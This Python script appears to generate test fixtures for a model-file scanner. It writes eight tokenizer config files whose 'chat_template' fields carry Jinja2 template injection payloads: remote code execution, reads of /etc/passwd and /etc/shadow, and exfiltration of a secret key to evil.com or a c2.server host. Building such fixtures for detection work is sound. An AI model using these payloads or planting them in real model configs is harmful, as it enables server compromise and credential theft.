#!/usr/bin/env python3
"""
Advanced Jinja2 Bypass Attack Vectors

Generates sophisticated Jinja2 template injection exploits including:
- Hex-encoded attribute access to bypass filters
- Attr filter chains for class traversal
- Request/config object exploitation
- Filter injection patterns
- Multi-layer obfuscation
- Network exfiltration payloads
- Advanced combined attacks

Based on ModelAudit official test cases:
- jinja2/malicious/hex_bypass.json
- jinja2/malicious/attr_bypass.json
- jinja2/malicious/request_exploit.json
- jinja2/malicious/config_exploit.json
- jinja2/malicious/combined_attack.json
- jinja2/malicious/network_exfil.json
"""

import json
from pathlib import Path
from typing import Tuple


class Jinja2BypassGenerator:
    """Generates advanced Jinja2 template injection attack vectors."""

    def __init__(self, output_dir: str = "output"):
        self.output_dir = Path(output_dir) / "jinja2_bypass_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate_hex_encoded_bypass(self) -> Tuple[str, int]:
        """
        Hex-encoded attribute access to bypass string filters.

        Attack Pattern:
        - Encodes attribute names as hex escape sequences
        - Example: '__' becomes '\\x5f\\x5f'
        - Bypasses filters checking for '__' in templates
        - Payload: Direct dunder method access

        CVE/Reference: CVE-2024-34359 variant with encoding
        Detection: Decode hex sequences before validation
        """
        filepath = self.output_dir / "01_hex_encoded_bypass.json"

        payload = {
            "tokenizer_class": "LlamaTokenizer",
            "model_max_length": 4096,
            # Hex bypass: __builtins__ becomes \\x5f\\x5fbuiltins\\x5f\\x5f
            "chat_template": "{{ request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['eval']('__import__(\"os\").system(\"id\")') }}",
            "bos_token": "<s>",
            "eos_token": "</s>",
            "eos_token_id": 2,
            "bos_token_id": 1,
        }

        with open(filepath, "w") as f:
            json.dump(payload, f, indent=2)

        # Metadata
        meta_path = self.output_dir / "01_hex_encoded_bypass.json.meta"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "hex_encoded_bypass",
                    "description": "Template injection via hex-encoded attribute access",
                    "attack_type": "ssti",
                    "encoding": "hex_escape_sequences",
                    "bypasses": "string_matching_filters",
                    "payload": "RCE via eval() and os.system()",
                    "detection_difficulty": "medium",
                    "severity": "critical",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_attr_filter_bypass(self) -> Tuple[str, int]:
        """
        Attr filter chain to bypass restrictions.

        Attack Pattern:
        - Uses Jinja2 'attr' filter repeatedly
        - Chains attribute access through filter application
        - Evades restrictions on '__' and '__class__'
        - Payload: Class traversal via filter chains

        CVE/Reference: Jinja2 filter bypass techniques
        Detection: Restrict 'attr' filter usage or validate chains
        """
        filepath = self.output_dir / "02_attr_filter_bypass.json"

        payload = {
            "tokenizer_class": "BertTokenizer",
            "model_max_length": 512,
            "chat_template": "{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(40)|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('system')('whoami') }}",
            "vocab_size": 30522,
            "hidden_size": 768,
        }

        with open(filepath, "w") as f:
            json.dump(payload, f, indent=2)

        # Metadata
        meta_path = self.output_dir / "02_attr_filter_bypass.json.meta"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "attr_filter_bypass",
                    "description": "Chained 'attr' filters to traverse class hierarchy",
                    "attack_type": "ssti",
                    "technique": "filter_chaining",
                    "filters_used": ["attr", "getitem"],
                    "payload": "os.system('whoami')",
                    "detection_difficulty": "hard",
                    "severity": "critical",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_request_object_exploit(self) -> Tuple[str, int]:
        """
        Flask/Werkzeug request object exploitation.

        Attack Pattern:
        - Accesses Flask 'request' object context
        - Traverses to application globals
        - Accesses __builtins__ for code execution
        - Payload: Application context RCE

        CVE/Reference: Flask context variable exploitation
        Detection: Request object whitelist, env validation
        """
        filepath = self.output_dir / "03_request_object_exploit.json"

        payload = {
            "tokenizer_class": "RobertaTokenizer",
            "model_max_length": 1024,
            "chat_template": "{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}",
            "vocab_size": 50265,
            "max_position_embeddings": 514,
        }

        with open(filepath, "w") as f:
            json.dump(payload, f, indent=2)

        # Metadata
        meta_path = self.output_dir / "03_request_object_exploit.json.meta"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "request_object_exploit",
                    "description": "Exploit Flask request object for application access",
                    "attack_type": "ssti",
                    "framework": "Flask/Werkzeug",
                    "attack_path": "request.application.__globals__.__builtins__",
                    "payload": "os.popen('cat /etc/passwd').read()",
                    "data_exfiltration": "file_reading",
                    "detection_difficulty": "high",
                    "severity": "critical",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_config_object_exploit(self) -> Tuple[str, int]:
        """
        Config object class hierarchy exploitation.

        Attack Pattern:
        - Traverses from 'config' object through class hierarchy
        - Uses __subclasses__() to find dangerous classes
        - Accesses subprocess or file operations
        - Payload: Arbitrary code execution via class discovery

        CVE/Reference: Application config object vulnerabilities
        Detection: Config object isolation, class filtering
        """
        filepath = self.output_dir / "04_config_object_exploit.json"

        payload = {
            "tokenizer_class": "GptTokenizer",
            "model_max_length": 2048,
            "chat_template": "{{ config.__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['subprocess'].call(['touch', '/tmp/pwned']) }}",
            "special_tokens_map": {
                "eos_token": "</s>",
                "bos_token": "<s>",
            },
        }

        with open(filepath, "w") as f:
            json.dump(payload, f, indent=2)

        # Metadata
        meta_path = self.output_dir / "04_config_object_exploit.json.meta"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "config_object_exploit",
                    "description": "Config object to subprocess via class discovery",
                    "attack_type": "ssti",
                    "technique": "class_subclass_discovery",
                    "target": "subprocess.call",
                    "payload": "subprocess.call(['touch', '/tmp/pwned'])",
                    "detection_difficulty": "hard",
                    "severity": "critical",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_filter_injection_pattern(self) -> Tuple[str, int]:
        """
        Custom filter injection to execute code.

        Attack Pattern:
        - Injects malicious filter definition
        - Filters execute Python code in context
        - Bypasses template restrictions
        - Payload: Arbitrary code via filter

        CVE/Reference: Filter registration vulnerabilities
        Detection: Filter whitelist, code inspection
        """
        filepath = self.output_dir / "05_filter_injection.json"

        payload = {
            "tokenizer_class": "T5Tokenizer",
            "model_max_length": 512,
            "chat_template": "{% set x = cycler.__init__.__globals__ %}{{ x.os.system('echo FILTER_INJECTION') }}",
            "extra_ids": 100,
        }

        with open(filepath, "w") as f:
            json.dump(payload, f, indent=2)

        # Metadata
        meta_path = self.output_dir / "05_filter_injection.json.meta"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "filter_injection",
                    "description": "Exploit cycler object for code execution",
                    "attack_type": "ssti",
                    "technique": "object_attribute_traversal",
                    "object": "cycler",
                    "payload": "os.system('echo FILTER_INJECTION')",
                    "detection_difficulty": "medium",
                    "severity": "critical",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_multi_layer_obfuscation(self) -> Tuple[str, int]:
        """
        Multi-layer obfuscation combining multiple bypass techniques.

        Attack Pattern:
        - Combines hex encoding + filter chains
        - Uses loops to obfuscate class discovery
        - Encodes payload in multiple layers
        - Payload: Complex multi-step RCE

        CVE/Reference: Advanced evasion techniques
        Detection: Behavioral analysis, deep inspection
        """
        filepath = self.output_dir / "06_multi_layer_obfuscation.json"

        payload = {
            "tokenizer_class": "ElectraTokenizer",
            "model_max_length": 1024,
            "chat_template": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen('cat /etc/shadow').read() }}{% endif %}{% endfor %}",
        }

        with open(filepath, "w") as f:
            json.dump(payload, f, indent=2)

        # Metadata
        meta_path = self.output_dir / "06_multi_layer_obfuscation.json.meta"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "multi_layer_obfuscation",
                    "description": "Loop-based class discovery with multiple obfuscation layers",
                    "attack_type": "ssti",
                    "techniques": ["loop_discovery", "class_traversal", "name_matching"],
                    "payload": "os.popen('cat /etc/shadow').read()",
                    "data_exfiltration": "sensitive_files",
                    "detection_difficulty": "hard",
                    "severity": "critical",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_network_exfiltration(self) -> Tuple[str, int]:
        """
        Network exfiltration via URL encoding.

        Attack Pattern:
        - Executes code to access network
        - Exfiltrates data to attacker server
        - Uses URL encoding for stealth
        - Payload: Data theft to remote server

        CVE/Reference: Data exfiltration through SSTI
        Detection: Network egress monitoring, URL validation
        """
        filepath = self.output_dir / "07_network_exfiltration.json"

        payload = {
            "tokenizer_class": "LongformerTokenizer",
            "model_max_length": 4096,
            "chat_template": "{{ joiner.__init__.__globals__.__builtins__.__import__('urllib.request').urlopen('http://evil.com/exfil?data=' + config.SECRET_KEY).read() }}",
        }

        with open(filepath, "w") as f:
            json.dump(payload, f, indent=2)

        # Metadata
        meta_path = self.output_dir / "07_network_exfiltration.json.meta"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "network_exfiltration",
                    "description": "Exfiltrate sensitive config data to attacker server",
                    "attack_type": "ssti",
                    "technique": "network_based_exfiltration",
                    "target_data": "config.SECRET_KEY",
                    "exfil_endpoint": "http://evil.com/exfil",
                    "detection_difficulty": "high",
                    "severity": "critical",
                    "impact": "credential_theft",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_combined_advanced_attack(self) -> Tuple[str, int]:
        """
        Combined advanced attack with multiple vectors.

        Attack Pattern:
        - Uses multiple bypass techniques together
        - Encodes sensitive operations
        - Combines exfiltration + execution
        - Payload: Multi-objective attack

        CVE/Reference: Advanced persistent SSTI
        Detection: Behavior monitoring, flow analysis
        """
        filepath = self.output_dir / "08_combined_advanced_attack.json"

        payload = {
            "tokenizer_class": "DebertaTokenizer",
            "model_max_length": 2048,
            "chat_template": "{% set x = cycler.__init__.__globals__ %}{% set y = x['__builtins__']['__import__'] %}{{ x.os.system('echo ' + y('os').environ.get('USER', 'unknown')) }} | {{ y('urllib.request').urlopen('http://c2.server/log').read() }}",
        }

        with open(filepath, "w") as f:
            json.dump(payload, f, indent=2)

        # Metadata
        meta_path = self.output_dir / "08_combined_advanced_attack.json.meta"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "combined_advanced_attack",
                    "description": "Multi-vector attack combining RCE, env access, and exfiltration",
                    "attack_type": "ssti",
                    "techniques": [
                        "variable_binding",
                        "environment_access",
                        "rce",
                        "exfiltration",
                    ],
                    "payload": "os.system() + env vars + network exfil",
                    "detection_difficulty": "very_high",
                    "severity": "critical",
                    "impact": "complete_compromise",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_all(self) -> dict[str, Tuple[str, int]]:
        """Generate all Jinja2 bypass attack vectors."""
        results = {}

        try:
            results["hex_encoded"] = self.generate_hex_encoded_bypass()
        except Exception as e:
            print(f"  [-] hex_encoded failed: {e}")

        try:
            results["attr_filter"] = self.generate_attr_filter_bypass()
        except Exception as e:
            print(f"  [-] attr_filter failed: {e}")

        try:
            results["request_exploit"] = self.generate_request_object_exploit()
        except Exception as e:
            print(f"  [-] request_exploit failed: {e}")

        try:
            results["config_exploit"] = self.generate_config_object_exploit()
        except Exception as e:
            print(f"  [-] config_exploit failed: {e}")

        try:
            results["filter_injection"] = self.generate_filter_injection_pattern()
        except Exception as e:
            print(f"  [-] filter_injection failed: {e}")

        try:
            results["multi_layer"] = self.generate_multi_layer_obfuscation()
        except Exception as e:
            print(f"  [-] multi_layer failed: {e}")

        try:
            results["network_exfil"] = self.generate_network_exfiltration()
        except Exception as e:
            print(f"  [-] network_exfil failed: {e}")

        try:
            results["combined"] = self.generate_combined_advanced_attack()
        except Exception as e:
            print(f"  [-] combined failed: {e}")

        return results

    def get_generated_files(self) -> list[Path]:
        """Return list of generated files."""
        return list(self.output_dir.glob("*"))
